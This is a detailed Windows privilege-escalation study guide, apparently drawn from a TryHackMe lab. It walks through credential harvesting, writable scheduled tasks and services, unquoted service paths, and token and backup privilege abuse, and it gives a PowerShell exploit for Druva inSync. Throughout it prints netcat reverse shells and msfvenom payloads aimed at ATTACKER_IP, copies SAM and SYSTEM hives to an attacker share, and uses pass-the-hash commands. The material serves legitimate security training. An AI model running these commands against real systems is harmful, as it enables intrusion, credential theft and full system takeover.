# Windows Privilege Escalation — Complete Revision & Reference

> **Purpose:** A complete revision guide for Windows privilege escalation based on the supplied THM material.
>
> **Important:** This version intentionally keeps the **full knowledge and technical coverage** from the source rather than reducing it to only a short cheat sheet. Lab-specific credentials/IPs are retained as examples where they explain the technique, but should only be used in the authorized lab environment.

---

# 1. Core Concept

Windows privilege escalation means using access to one account (**User A**) to gain access to another account (**User B**) by abusing a weakness in the target system.

The target account is often an administrator, but escalation may also happen in stages:

```text
User A
  ↓
Another unprivileged account
  ↓
Administrator / SYSTEM
```

Common weaknesses include:

- Misconfigurations in Windows services
- Misconfigurations in scheduled tasks
- Excessive privileges assigned to an account
- Vulnerable software
- Missing Windows security patches
- Exposed credentials

---

# 2. Windows Account Types

## Administrators

Administrators have the highest privileges among normal user groups.

They can:

- Change system configuration
- Access system files
- Perform administrative tasks

Administrative users belong to:

```text
Administrators
```

## Standard Users

Standard users have limited access.

Typically they:

- Can use the computer
- Can access their own files
- Cannot make permanent/essential system changes

They belong to:

```text
Users
```

---

# 3. Special Windows Accounts

## SYSTEM / LocalSystem

`SYSTEM` / `LocalSystem` is used by Windows for internal tasks.

It has extremely high privileges and access to system resources, with privileges beyond those normally available to administrators.

Common identity:

```text
NT AUTHORITY\SYSTEM
```

## Local Service

A built-in account commonly used to run Windows services with minimal privileges.

Network authentication uses anonymous credentials.

## Network Service

Another built-in service account.

It uses the computer's credentials when authenticating over the network.

### Important

These accounts are managed by Windows and are not ordinary interactive user accounts.

However, privilege-escalation vulnerabilities can allow an attacker to obtain their security context.

---

# 4. Credential Harvesting — Usual Spots

Finding credentials is often one of the easiest privilege-escalation paths.

Look for credentials stored in:

- Unattended installation files
- PowerShell history
- Saved Windows credentials
- IIS configuration
- PuTTY configuration
- Other applications that store passwords

---

# 5. Unattended Windows Installations

Large Windows deployments can use **Windows Deployment Services (WDS)** to deploy a common OS image to multiple machines.

These unattended installations may require administrator credentials during setup.

Those credentials can end up stored in files such as:

```text
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

You may encounter credential structures such as:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### What to look for

```text
Username
Domain
Password
Credentials
```

### Core lesson

> Installation/deployment configuration files may contain administrator credentials.

---

# 6. PowerShell History

PowerShell keeps a history of previously executed commands.

If a user typed a password directly into a PowerShell command, it may remain in the history file.

From `cmd.exe`:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

From PowerShell:

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Important syntax difference

`%userprofile%` is a `cmd.exe` environment-variable syntax.

PowerShell uses:

```powershell
$Env:userprofile
```

### Revision lesson

Whenever you obtain access to a Windows account, inspect its PowerShell history for:

- Passwords
- API keys
- Administrative commands
- Credentials passed directly as arguments

---

# 7. Saved Windows Credentials

Windows can save credentials for use with other accounts/resources.

List stored credentials:

```cmd
cmdkey /list
```

The actual password is not displayed.

However, interesting stored credentials may be usable with `runas`.

Example:

```cmd
runas /savecred /user:admin cmd.exe
```

### Key idea

```text
cmdkey /list
      ↓
Identify useful saved credential
      ↓
runas /savecred
      ↓
Run a process as another account
```

---

# 8. IIS Configuration

**Internet Information Services (IIS)** is the default Windows web server.

Website configuration is commonly stored in:

```text
web.config
```

Possible locations include:

```text
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

These files may contain:

- Database connection strings
- Authentication configuration
- Passwords
- Other sensitive configuration

Search for connection strings:

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Core lesson

> Web-server configuration files can expose credentials that lead to privilege escalation or lateral movement.

---

# 9. Retrieving Credentials from Software — PuTTY

PuTTY is an SSH client commonly found on Windows.

Users can save sessions containing:

- IP addresses
- Usernames
- Connection settings

PuTTY does not normally store SSH passwords, but it can store proxy configuration containing cleartext authentication credentials.

The relevant registry location is:

```text
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```

Search for proxy-related entries:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Important clarification

`SimonTatham` is the creator's name and forms part of the registry path. It is **not** the Windows username whose credentials are being retrieved.

### Broader lesson

Other software may also store recoverable credentials, including:

- Browsers
- Email clients
- FTP clients
- SSH clients
- VNC software
- Other applications with password-saving functionality

---

# 10. Quick-Win Privilege Escalation

Not every privilege-escalation scenario requires a sophisticated exploit.

Some simple misconfigurations can provide access to:

- Higher-privileged users
- Administrator
- SYSTEM

The source notes that these cases are particularly common in CTF-style environments, although they remain useful findings to check during authorized testing.

---

# 11. Scheduled Tasks

Windows scheduled tasks can execute programs/scripts automatically.

A privilege-escalation opportunity can exist when:

1. A scheduled task runs as a higher-privileged account.
2. The executable/script it runs is missing, replaceable, or modifiable.
3. The current user can modify or overwrite it.

## Enumerate tasks

```cmd
schtasks
```

For detailed information about a task:

```cmd
schtasks /query /tn vulntask /fo list /v
```

Important fields include:

```text
Task To Run
Run As User
```

Example:

```text
Task To Run: C:\tasks\schtask.bat
Run As User: taskusr1
```

### Investigation workflow

```text
Scheduled task
    ↓
What does it execute?
    ↓
Who does it run as?
    ↓
Can I modify the executable/script?
    ↓
Potential privilege escalation
```

---

# 12. Checking Scheduled-Task File Permissions

Use:

```cmd
icacls C:\tasks\schtask.bat
```

Example:

```text
C:\tasks\schtask.bat
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(F)
```

`F` means **Full access**.

If the current user is included in a group with full/modify access, the task's executable can potentially be modified.

### Lab exploitation pattern

The source demonstrates replacing the task's batch-file contents with a reverse-shell command using `nc64.exe`:

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start a listener:

```bash
nc -lvp 4444
```

If you have permission to trigger the task manually:

```cmd
schtasks /run /tn vulntask
```

The resulting shell runs with the privileges of the task's configured account.

Verification:

```cmd
whoami
```

Lab example:

```text
wprivesc1\taskusr1
```

### Important lesson

The payload is not the main thing to memorize.

Memorize the vulnerability pattern:

```text
Privileged scheduled task
        +
User-writable task executable/script
        ↓
User controls privileged execution
```

---

# 13. AlwaysInstallElevated

Windows Installer packages use `.msi` files.

Normally, an installer runs with the privilege level of the user starting it.

However, Windows can be configured so that MSI packages are installed with elevated privileges for any user, including unprivileged users.

This configuration can potentially allow a malicious MSI to execute with administrative privileges.

> **Room note:** The source explicitly states that AlwaysInstallElevated does **not** work on that room's machine and is included for information.

## Required registry values

Check:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Both required settings must be enabled for this technique to work.

### Lab-style payload generation

The source demonstrates:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

After transferring the MSI:

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Core lesson

```text
HKCU setting enabled
        +
HKLM setting enabled
        ↓
Potential AlwaysInstallElevated abuse
```

---

# 14. Windows Services

Windows services are managed by the **Service Control Manager (SCM)**.

The SCM:

- Manages service state
- Checks service status
- Controls service configuration
- Starts/stops services as needed

Each service has:

1. An associated executable.
2. A configured account under which it runs.

---

# 15. Enumerating Service Configuration

Use:

```cmd
sc qc <service>
```

Example:

```cmd
sc qc apphostsvc
```

Important fields:

```text
BINARY_PATH_NAME
SERVICE_START_NAME
```

Example:

```text
BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
SERVICE_START_NAME : localSystem
```

### Meaning

```text
BINARY_PATH_NAME
        ↓
What executable/command the service runs

SERVICE_START_NAME
        ↓
Which account runs the service
```

---

# 16. Service DACLs

Services have a **Discretionary Access Control List (DACL)**.

A service DACL controls who can perform operations such as:

- Start
- Stop
- Pause
- Query status
- Query configuration
- Reconfigure

Service configuration is stored in the registry under:

```text
HKLM\SYSTEM\CurrentControlSet\Services\
```

Each service has a corresponding registry subkey.

Important values include:

```text
ImagePath
ObjectName
Security
```

Where:

- `ImagePath` identifies the associated executable.
- `ObjectName` identifies the account used to start the service.
- `Security` can contain the service DACL.

---

# 17. Service Misconfiguration #1 — Insecure Service Executable Permissions

If a service executable is writable by a low-privileged user, that user may be able to replace it.

If the service runs as a more privileged account:

```text
Writable service executable
        +
Service runs as privileged account
        ↓
Potential privilege escalation
```

---

# 18. Example — System Scheduler Service

Enumerate:

```cmd
sc qc WindowsScheduler
```

Example:

```text
BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
SERVICE_START_NAME : .\svcuser1
```

Check permissions:

```cmd
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

Example:

```text
Everyone:(I)(M)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

`M` = Modify.

Thus:

```text
Everyone:(M)
```

means the executable can potentially be modified/replaced.

---

# 19. Replacing a Writable Service Executable

The source demonstrates generating an EXE-service payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

Serve it from the attacker machine:

```bash
python3 -m http.server
```

Download from PowerShell:

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Replace the vulnerable service executable:

```cmd
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

Start a listener:

```bash
nc -lvp 4445
```

Restart the service:

```cmd
sc stop windowsscheduler
sc start windowsscheduler
```

PowerShell note:

> PowerShell has `sc` as an alias for `Set-Content`. Use `sc.exe` when controlling services from PowerShell.

Verify:

```cmd
whoami
```

Lab result:

```text
wprivesc1\svcusr1
```

### Key lesson

The privilege obtained is the privilege of the **service account**.

---

# 20. Service Misconfiguration #2 — Unquoted Service Paths

A service may have a vulnerable executable path containing spaces without proper quotation.

Example of a correctly quoted path:

```text
"C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
```

The quotes clearly identify the executable.

An unsafe version:

```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

contains spaces but is not quoted.

---

# 21. How Unquoted Service Path Parsing Works

Consider:

```text
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

The SCM can interpret possible executable paths in stages:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

The associated arguments differ depending on which path is selected.

The important behavior is:

1. Try the first candidate executable.
2. If it does not exist, try the next candidate.
3. Continue until the intended executable is reached.

Therefore, if an attacker can create a malicious executable at an earlier candidate path, the service may execute it.

---

# 22. Conditions Required for Unquoted Service-Path Abuse

An unquoted path alone is **not enough**.

You also need the relevant directory to be writable.

The source notes explain that service binaries are commonly installed under:

```text
C:\Program Files
C:\Program Files (x86)
```

These locations are generally not writable by ordinary users.

Potential exceptions:

- An installer changed directory permissions.
- An administrator installed software under a writable custom directory.

### Check directory permissions

```cmd
icacls C:\MyPrograms
```

Example:

```text
BUILTIN\Users:(I)(CI)(AD)
BUILTIN\Users:(I)(CI)(WD)
```

The source explains:

- `AD` = Add subdirectory
- `WD` = Write data / create files

Thus users can create files/directories in the relevant location.

---

# 23. Unquoted Service Path — Lab Exploitation Pattern

Generate a service-compatible payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```

Start a listener:

```bash
nc -lvp 4446
```

Place the payload at the earlier executable path:

```cmd
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```

Grant execution permissions:

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

Restart the vulnerable service:

```cmd
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```

Verify:

```cmd
whoami
```

Lab result:

```text
wprivesc1\svcusr2
```

### Mental model

```text
Unquoted service path
        +
Spaces in path
        +
Writable earlier path
        ↓
SCM may execute attacker-controlled binary
        ↓
Privileges of service account
```

---

# 24. Service Misconfiguration #3 — Insecure Service Permissions

Even if:

- The service executable itself is protected.
- The binary path is correctly quoted.

There may still be an escalation path if the **service DACL** allows the current user to modify the service configuration.

This is different from modifying the executable.

### Distinguish these two:

```text
Executable DACL
    ↓
Can I modify the service binary?

Service DACL
    ↓
Can I modify how the service is configured?
```

---

# 25. AccessChk

**AccessChk** is part of the Sysinternals suite.

It can inspect service permissions.

Example:

```cmd
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

If the output shows:

```text
BUILTIN\Users
SERVICE_ALL_ACCESS
```

then members of `Users` can potentially reconfigure the service.

---

# 26. Reconfiguring a Service

Generate a service-compatible payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```

Transfer it to the target.

Grant execution permissions:

```cmd
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Reconfigure the service:

```cmd
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

### Important syntax

When using `sc.exe config`, note the spaces after the `=` signs:

```text
binPath= ...
obj= ...
```

The source demonstrates changing both:

- Executable path
- Service account

The chosen account is:

```text
LocalSystem
```

because it provides the highest privilege available to the technique.

Restart:

```cmd
sc stop THMService
sc start THMService
```

Verify:

```cmd
whoami
```

Lab result:

```text
NT AUTHORITY\SYSTEM
```

### Key lesson

```text
Service DACL allows reconfiguration
        ↓
Change binary path / service account
        ↓
Restart service
        ↓
SYSTEM
```

---

# 27. Dangerous Windows Privileges

Windows privileges are rights assigned to accounts that allow specific system operations.

Examples include privileges that allow:

- Shutting down the machine
- Bypassing certain DACL access checks
- Backing up/restoring files
- Taking ownership
- Impersonating users

List the current account's privileges:

```cmd
whoami /priv
```

Not every privilege is useful for escalation.

The key is to identify privileges that can be abused to obtain a more privileged security context.

---

# 28. SeBackupPrivilege / SeRestorePrivilege

## What they allow

`SeBackupPrivilege` and `SeRestorePrivilege` allow a user to read/write files while bypassing normal DACL restrictions for backup/restore operations.

Their intended purpose is to let backup operators work with files without requiring full administrator privileges.

From an attacker's perspective, this can provide powerful escalation paths.

---

# 29. SAM + SYSTEM Hive Extraction

One technique is to copy the:

```text
SAM
SYSTEM
```

registry hives.

These can be used to recover local account password hashes.

The source lab uses a user in the:

```text
Backup Operators
```

group.

Check privileges:

```cmd
whoami /priv
```

Example:

```text
SeBackupPrivilege
SeRestorePrivilege
```

The source notes that an elevated command prompt may be required in that lab to use these privileges.

---

# 30. Saving the Registry Hives

Save SYSTEM:

```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

Save SAM:

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

These create files containing registry-hive data.

---

# 31. Transfer the Hives

The source demonstrates using Impacket's SMB server.

On the attacker machine:

```bash
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Copy from Windows:

```cmd
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

---

# 32. Extract Local Password Hashes

Use Impacket:

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

The output contains local SAM hashes, for example:

```text
Administrator:500:LMHASH:NTHASH:::
Guest:501:LMHASH:NTHASH:::
```

### Important concept

You are not recovering the plaintext password here.

You are extracting password **hashes** from the local SAM using the SYSTEM hive information needed to interpret them.

---

# 33. Pass-the-Hash

A recovered NT hash can potentially be used for authentication without knowing the plaintext password.

The source demonstrates using Impacket `psexec.py`:

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes LMHASH:NTHASH administrator@TARGET_IP
```

The lab result provides:

```text
nt authority\system
```

### Attack chain

```text
SeBackup / SeRestore
        ↓
Read SAM + SYSTEM
        ↓
Extract Administrator NT hash
        ↓
Pass-the-Hash
        ↓
Administrative authentication
        ↓
SYSTEM shell
```

---

# 34. SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` allows a user to take ownership of objects such as:

- Files
- Registry keys
- Other system objects

Taking ownership can open further escalation possibilities.

One possible route is:

```text
Find privileged file/service executable
        ↓
Take ownership
        ↓
Grant yourself required permissions
        ↓
Modify/replace object
        ↓
Privilege escalation
```

---

# 35. Example — Abusing Utilman.exe

The source uses `utilman.exe`.

Utilman is a Windows accessibility application available from the lock screen.

The important property in this lab scenario is that Utilman executes with:

```text
SYSTEM
```

Therefore, replacing it with another executable can result in SYSTEM execution when Utilman is triggered.

> This is a lab technique demonstrating the impact of `SeTakeOwnershipPrivilege`; do not apply it to systems without explicit authorization.

---

# 36. Taking Ownership of Utilman

Take ownership:

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

Example result:

```text
SUCCESS: The file ... now owned by user ...
```

### Important concept

Being the owner does **not automatically mean** you have full access.

However, ownership allows you to modify the object's permissions.

Grant full control:

```cmd
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Replace Utilman with `cmd.exe`:

```cmd
copy cmd.exe utilman.exe
```

Lock the screen and trigger **Ease of Access**.

Because the replaced binary is launched in the SYSTEM context in the lab scenario, the resulting command prompt has SYSTEM privileges.

Verify:

```cmd
whoami
```

Expected privilege level:

```text
NT AUTHORITY\SYSTEM
```

### Attack chain

```text
SeTakeOwnershipPrivilege
        ↓
Take ownership of Utilman.exe
        ↓
Grant yourself Full control
        ↓
Replace Utilman.exe
        ↓
Trigger Utilman
        ↓
SYSTEM command prompt
```

---

# 37. SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

These privileges are related to **token impersonation**.

They allow a process to impersonate another user's security context and act on that user's behalf.

## Why impersonation exists

Consider an FTP server running as:

```text
ftp
```

If a user named Ann connects, the FTP service needs to access Ann's files.

Without impersonation:

```text
FTP service
    ↓
Uses ftp account token
    ↓
Needs ftp permissions on every served file
```

This creates several problems:

- Files would need permissions for the FTP account.
- The operating system cannot directly enforce each user's authorization.
- A compromised FTP service would inherit all files accessible to the FTP account.

With impersonation:

```text
FTP service
    ↓
Borrows Ann's access token
    ↓
Accesses Ann's files as Ann
```

The operating system can then enforce Ann's permissions.

---

# 38. Why Impersonation Matters to Attackers

If an attacker controls a process that has:

```text
SeImpersonatePrivilege
```

or:

```text
SeAssignPrimaryTokenPrivilege
```

they may be able to impersonate a more privileged user who connects/authenticates to that process.

Common accounts that may have these privileges include:

- `LOCAL SERVICE`
- `NETWORK SERVICE`
- IIS application pool accounts such as:
  ```text
  iis apppool\defaultapppool
  ```

---

# 39. Conditions for Impersonation-Based Escalation

The source identifies two important requirements:

### Requirement 1

Spawn/control a process that allows users to connect and authenticate to it.

### Requirement 2

Find a way to make a privileged user connect/authenticate to that process.

Conceptually:

```text
Attacker-controlled process
        +
Impersonation privilege
        +
Privileged user's authentication
        ↓
Privileged token
        ↓
Potential SYSTEM execution
```

---

# 40. RogueWinRM

The source uses **RogueWinRM** to satisfy these conditions.

The lab scenario assumes a compromised IIS web application/web shell.

First verify the compromised account's privileges:

```cmd
whoami /priv
```

The important privileges are:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

---

# 41. Why RogueWinRM Works

The source explains that when the **BITS** service is started, it can create a connection to:

```text
port 5985
```

Port `5985` is commonly associated with **WinRM**.

WinRM exposes PowerShell functionality remotely and can be thought of conceptually as similar to SSH, but using PowerShell/Windows remote management.

If the normal WinRM service is not running, RogueWinRM can create a fake service on port 5985 and receive the BITS authentication attempt.

If the attacker has impersonation privileges, that authentication can be used to execute commands under the connecting user's security context.

In the lab, the connecting user is:

```text
SYSTEM
```

---

# 42. RogueWinRM Lab Workflow

Start a listener:

```bash
nc -lvp 4442
```

Execute RogueWinRM:

```cmd
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

Where:

```text
-p
    Executable to run

-a
    Arguments passed to that executable
```

The source uses:

```text
nc64.exe
```

to establish a reverse shell.

### Timing note

The exploit may take up to approximately two minutes in the lab.

The source explains this can happen because BITS may need time to stop before it can be started again.

Verify:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

### Core attack chain

```text
Compromised IIS/web process
        ↓
SeImpersonate / SeAssignPrimaryToken
        ↓
RogueWinRM
        ↓
BITS → WinRM authentication
        ↓
Impersonation of SYSTEM
        ↓
SYSTEM shell
```

---

# 43. Vulnerable Software

Installed software can introduce privilege-escalation opportunities.

A common reason is:

> Applications may not be patched as consistently as the operating system.

## Enumerate installed software

The source uses:

```cmd
wmic product get name,version,vendor
```

This can show:

- Product name
- Version
- Vendor

### Important limitation

`wmic product` may **not list every installed program**.

Software installed through other mechanisms may be absent.

Therefore also inspect:

- Desktop shortcuts
- Services
- Installed application traces
- Other evidence of software on the host

---

# 44. Researching Vulnerable Software

Once software/version information is collected, search for known vulnerabilities.

Potential research sources mentioned in the source include:

- Exploit-DB
- Packet Storm
- Google
- Other public vulnerability/exploit resources

General workflow:

```text
Installed software
        ↓
Version
        ↓
Known CVE/vulnerability?
        ↓
Public exploit?
        ↓
Evaluate compatibility
        ↓
Exploit in authorized environment
```

---

# 45. Case Study — Druva inSync 6.6.3

The source uses **Druva inSync 6.6.3** as a case study.

The software was vulnerable to privilege escalation due to an RPC service.

It runs an RPC server on:

```text
Port 6064
```

The server:

- Runs with SYSTEM privileges.
- Is accessible from localhost.
- Exposes procedures to clients.

---

# 46. Druva RPC Vulnerability

A vulnerable procedure was:

```text
Procedure 5
```

It allowed a client to request execution of arbitrary commands.

Because the RPC server ran as SYSTEM:

```text
RPC command execution
        ↓
SYSTEM process
        ↓
SYSTEM privileges
```

---

# 47. Patch Bypass via Path Traversal

The original vulnerability allowed unrestricted command execution.

A patch attempted to restrict execution to paths beginning with:

```text
C:\ProgramData\Druva\inSync4\
```

However, checking only the beginning of the string was insufficient.

Path traversal could bypass the restriction.

Example:

```text
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

The apparent allowed prefix is preserved, but `..\` traversal escapes the directory.

### Core lesson

> Path validation based only on string prefixes can be vulnerable when path traversal is possible.

---

# 48. Druva RPC Protocol Structure

The source explains the exploit communication as a sequence of packets:

```text
1. Hello packet
       ↓
2. Procedure number
       ↓
3. Command length
       ↓
4. Command string
```

The exploit connects to:

```text
127.0.0.1:6064
```

It sends:

- A fixed hello string
- Procedure number `5`
- Command length
- Command

---

# 49. Druva Exploit — Source Example

The source provides a PowerShell exploit structure:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)

$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

The lab source notes that this exploit was also available at:

```text
C:\tools\Druva_inSync_exploit.txt
```

---

# 50. More Useful Druva Payload

The default example creates a user without administrative privileges:

```cmd
net user pwnd /add
```

The source changes the payload to:

```cmd
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

This:

1. Creates user `pwnd`.
2. Sets the password.
3. Adds the user to the local Administrators group.

Verify:

```cmd
net user pwnd
```

The expected group membership includes:

```text
Administrators
Users
```

Then use the `pwnd` account to open an administrative command prompt and access the Administrator desktop in the lab.

### Core vulnerability pattern

```text
Vulnerable privileged service
        +
Unauthenticated/local command execution
        +
SYSTEM execution context
        ↓
Privilege escalation
```

---

# 51. Automated Windows Enumeration Tools

Automated enumeration tools can significantly reduce enumeration time and uncover different privilege-escalation vectors.

However:

> **Automated tools can miss privilege-escalation opportunities.**

Use them as assistants, then manually validate important findings.

---

# 52. WinPEAS

**WinPEAS** is a Windows privilege-escalation enumeration script.

It searches the target system for potential escalation paths and executes many enumeration commands.

The output can be:

- Long
- Difficult to read

A useful technique is redirecting output to a file:

```cmd
winpeas.exe > outputfile.txt
```

This allows easier review and searching.

---

# 53. PrivescCheck

**PrivescCheck** is a PowerShell-based privilege-escalation enumeration script.

It provides an alternative to WinPEAS without requiring execution of a compiled binary.

The source notes that PowerShell execution policy may need to be bypassed for the current process.

Example:

```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
```

Then load the script:

```powershell
. .\PrivescCheck.ps1
```

Run it:

```powershell
Invoke-PrivescCheck
```

### Key advantage

Because it is a PowerShell script, it can be useful when running a binary is undesirable or restricted.

---

# 54. WES-NG — Windows Exploit Suggester Next Generation

**WES-NG** can identify missing patches and potentially exploitable vulnerabilities.

An important advantage is that it can run on the **attacker machine**, rather than requiring the enumeration script itself to be uploaded and executed on the target.

This can reduce the need to place suspicious enumeration binaries on the target and may reduce the chance of antivirus detection/deletion.

---

# 55. WES-NG Workflow

### Step 1 — Update database

```bash
wes.py --update
```

This updates the vulnerability database.

### Step 2 — Collect target system information

On the Windows target:

```cmd
systeminfo
```

Save the output to a text file.

### Step 3 — Move output to attacker machine

Transfer the `systeminfo` output to the attacking machine.

### Step 4 — Run WES-NG

```bash
wes.py systeminfo.txt
```

WES-NG compares the target information against its vulnerability database and identifies missing patches that may correspond to exploitable vulnerabilities.

---

# 56. Metasploit Local Exploit Suggester

If you already have a Meterpreter session, Metasploit provides:

```text
multi/recon/local_exploit_suggester
```

This module can suggest local vulnerabilities that may allow privilege escalation on the target.

### Mental model

```text
Meterpreter session
        ↓
local_exploit_suggester
        ↓
Potential local vulnerabilities
        ↓
Evaluate compatibility
        ↓
Authorized exploitation
```

---

# 57. Important Tool Comparison

| Tool | Runs where? | Main purpose |
|---|---|---|
| **WinPEAS** | Target | Broad Windows privilege-escalation enumeration |
| **PrivescCheck** | Target | PowerShell-based privilege-escalation enumeration |
| **WES-NG** | Attacker | Suggest missing-patch vulnerabilities from `systeminfo` |
| **Metasploit local_exploit_suggester** | Via Meterpreter | Suggest local exploits |
| **AccessChk** | Target | Inspect permissions, including service DACLs |
| **WMIC** | Target | Enumerate installed software/version information |
| **schtasks** | Target | Enumerate scheduled tasks |
| **sc.exe** | Target | Query/control/configure services |
| **whoami /priv** | Target | Enumerate account privileges |
| **icacls** | Target | Inspect file/directory permissions |
| **cmdkey** | Target | Enumerate saved Windows credentials |

---

# 58. Full Windows Privilege-Escalation Methodology

Use a layered approach.

## Phase 1 — Identify the current context

```cmd
whoami
whoami /priv
```

Understand:

- Current account
- Current privileges
- Group membership
- Security context

---

## Phase 2 — Search for credentials

Check:

```text
Unattend.xml
PowerShell history
cmdkey
IIS web.config
PuTTY registry entries
Application/browser credential stores
```

---

## Phase 3 — Check scheduled tasks

```cmd
schtasks
schtasks /query /tn <task> /fo list /v
```

Ask:

- What executes?
- Who executes it?
- Can I modify it?

---

## Phase 4 — Check services

```cmd
sc.exe qc <service>
```

Investigate:

- Binary path
- Service account
- Executable permissions
- Service DACL
- Quotation of paths

---

## Phase 5 — Check dangerous privileges

```cmd
whoami /priv
```

High-value findings include:

```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

---

## Phase 6 — Enumerate software

```cmd
wmic product get name,version,vendor
```

Also inspect:

- Services
- Shortcuts
- Installed application traces

---

## Phase 7 — Research vulnerabilities

For interesting software:

```text
Version
  ↓
CVE
  ↓
Public exploit
  ↓
Compatibility
  ↓
Safety/stability
```

---

## Phase 8 — Automate

Run tools such as:

```text
WinPEAS
PrivescCheck
WES-NG
Metasploit local_exploit_suggester
```

Use automation to find leads, not as proof that no vulnerability exists.

---

# 59. High-Value Attack Patterns

## Pattern A — Credential exposure

```text
Credential stored insecurely
        ↓
Recover credential
        ↓
Authenticate as another user
        ↓
Higher privileges
```

---

## Pattern B — Writable scheduled task

```text
Scheduled task
        ↓
Runs as privileged user
        ↓
Task executable/script is writable
        ↓
Modify execution
        ↓
Privileged shell
```

---

## Pattern C — Writable service executable

```text
Service
        ↓
Runs as privileged account
        ↓
Executable is writable
        ↓
Replace executable
        ↓
Restart service
        ↓
Service-account privileges
```

---

## Pattern D — Unquoted service path

```text
Unquoted path
        +
Spaces
        +
Writable earlier candidate path
        ↓
SCM executes attacker-controlled binary
```

---

## Pattern E — Writable service configuration

```text
Service DACL
        ↓
Current user has reconfiguration rights
        ↓
Change binPath / account
        ↓
Restart
        ↓
SYSTEM
```

---

## Pattern F — Dangerous privilege

```text
Dangerous assigned privilege
        ↓
Abuse privilege-specific functionality
        ↓
Access protected object / impersonate user
        ↓
Higher privilege
```

---

## Pattern G — Vulnerable software

```text
Installed software
        ↓
Version
        ↓
Known vulnerability
        ↓
Public exploit
        ↓
Privileged execution
```

---

